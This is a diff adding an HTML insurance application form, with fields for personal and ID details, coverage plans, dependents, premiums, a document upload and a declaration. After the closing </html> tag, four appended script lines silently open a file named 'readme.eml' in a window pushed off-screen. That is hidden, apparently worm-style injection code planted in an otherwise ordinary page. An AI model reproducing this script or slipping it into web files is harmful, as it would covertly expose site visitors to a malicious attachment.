@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Application Form</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="form-container">
+    <h1>Application Form</h1>
+    <p class="required-note">Fields marked with * are required.</p>
+
+    <form>
+        <!-- A. General Information -->
+        <div class="section-badge">A. General Information</div>
+        <div class="section-box">
+            <div class="row">
+                <div class="form-group">
+                    <label>Proposed Insured's Full Name <span class="asterisk">*</span></label>
+                    <input type="text">
+                </div>
+                <div class="form-group">
+                    <label>Birth Date <span class="asterisk">*</span></label>
+                    <input type="date">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Gender:</label>
+                <div class="radio-group">
+                    <label><input type="radio" name="gender" value="Male"> Male</label>
+                    <label><input type="radio" name="gender" value="Female"> Female</label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Address <span class="asterisk">*</span></label>
+                <textarea></textarea>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>Phone Number <span class="asterisk">*</span></label>
+                    <input type="text" placeholder="+92 300 1234567">
+                </div>
+                <div class="form-group">
+                    <label>Email Address <span class="asterisk">*</span></label>
+                    <input type="email" placeholder="name@example.com">
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>ID / CNIC Number <span class="asterisk">*</span></label>
+                    <input type="text" placeholder="42101-1234567-1">
+                </div>
+                <div class="form-group">
+                    <label>Social Security / Reference Number</label>
+                    <input type="text">
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>Marital Status <span class="asterisk">*</span></label>
+                    <select>
+                        <option value="">Select status</option>
+                        <option value="Single">Single</option>
+                        <option value="Married">Married</option>
+                        <option value="Divorced">Divorced</option>
+                        <option value="Widowed">Widowed</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Occupation <span class="asterisk">*</span></label>
+                    <input type="text">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Are you retired?</label>
+                <div class="radio-group">
+                    <label><input type="radio" name="retired" value="Yes"> Yes</label>
+                    <label><input type="radio" name="retired" value="No"> No</label>
+                </div>
+            </div>
+        </div>
+
+        <!-- B. Type of Health Coverage -->
+        <div class="section-badge">B. Type of Health Coverage</div>
+        <div class="section-box">
+            <div class="form-group">
+                <label>Employee Coverage</label>
+                <div class="radio-group">
+                    <label><input type="radio" name="emp_cov" value="Yes"> Yes</label>
+                    <label><input type="radio" name="emp_cov" value="No"> No</label>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Employee Plan Choice</label>
+                <select>
+                    <option value="">Select plan</option>
+                    <option value="Basic">Basic</option>
+                    <option value="Standard">Standard</option>
+                    <option value="Premium">Premium</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Spouse Coverage</label>
+                <div class="radio-group">
+                    <label><input type="radio" name="spouse_cov" value="Yes"> Yes</label>
+                    <label><input type="radio" name="spouse_cov" value="No"> No</label>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Spouse Plan Choice</label>
+                <select>
+                    <option value="">Select plan</option>
+                    <option value="Basic">Basic</option>
+                    <option value="Standard">Standard</option>
+                    <option value="Premium">Premium</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Children Coverage</label>
+                <div class="radio-group">
+                    <label><input type="radio" name="child_cov" value="Yes"> Yes</label>
+                    <label><input type="radio" name="child_cov" value="No"> No</label>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Children Plan Choice</label>
+                <select>
+                    <option value="">Select plan</option>
+                    <option value="Basic">Basic</option>
+                    <option value="Standard">Standard</option>
+                    <option value="Premium">Premium</option>
+                </select>
+            </div>
+        </div>
+
+        <!-- C. Spouse / Children Information -->
+        <div class="section-badge">C. Spouse / Children Information</div>
+        <div class="section-box">
+            <div class="row">
+                <div class="form-group">
+                    <label>Dependent Name</label>
+                    <input type="text">
+                </div>
+                <div class="form-group">
+                    <label>ID / SSN</label>
+                    <input type="text">
+                </div>
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label>Relationship</label>
+                    <select>
+                        <option value="">Select relationship</option>
+                        <option value="Spouse">Spouse</option>
+                        <option value="Child">Child</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Birth Date</label>
+                    <input type="date">
+                </div>
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label>Age</label>
+                    <input type="text">
+                </div>
+                <div class="form-group">
+                    <label>Gender</label>
+                    <select>
+                        <option value="">Select gender</option>
+                        <option value="Male">Male</option>
+                        <option value="Female">Female</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+
+        <!-- D. Policy Information -->
+        <div class="section-badge">D. Policy Information</div>
+        <div class="section-box">
+            <div class="row">
+                <div class="form-group">
+                    <label>Units</label>
+                    <input type="text">
+                </div>
+                <div class="form-group">
+                    <label>Annual Premium</label>
+                    <input type="text">
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Payment Mode <span class="asterisk">*</span></label>
+                <select>
+                    <option value="">Select payment mode</option>
+                    <option value="Monthly">Monthly</option>
+                    <option value="Quarterly">Quarterly</option>
+                    <option value="Annually">Annually</option>
+                </select>
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label>Cash With Application</label>
+                    <input type="text">
+                </div>
+                <div class="form-group">
+                    <label>Planned Monthly Premium</label>
+                    <input type="text">
+                </div>
+            </div>
+        </div>
+
+        <!-- E. Required Document -->
+        <div class="section-badge">E. Required Document</div>
+        <div class="section-box">
+            <p class="hint" style="margin-bottom: 10px;">Please attach your supporting document before submitting the application.</p>
+            <div class="form-group">
+                <label>Attach Document <span class="asterisk">*</span></label>
+                <input type="file">
+                <p class="hint">Accepted formats: PDF, JPG, JPEG and PNG</p>
+            </div>
+        </div>
+
+        <!-- F. Declaration -->
+        <div class="section-badge">F. Declaration</div>
+        <div class="section-box">
+            <div class="checkbox-group">
+                <input type="checkbox" id="decl">
+                <label for="decl">I confirm that the information provided in this application is complete and accurate.</label>
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label>Applicant Full Name / Signature <span class="asterisk">*</span></label>
+                    <input type="text">
+                </div>
+                <div class="form-group">
+                    <label>Application Date <span class="asterisk">*</span></label>
+                    <input type="date">
+                </div>
+            </div>
+        </div>
+
+        <!-- Buttons -->
+        <div class="buttons">
+            <button type="reset" class="btn btn-clear">Clear Form</button>
+            <button type="submit" class="btn btn-submit">Submit Application</button>
+        </div>
+    </form>
+</div>
+
+</body>
+</html>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
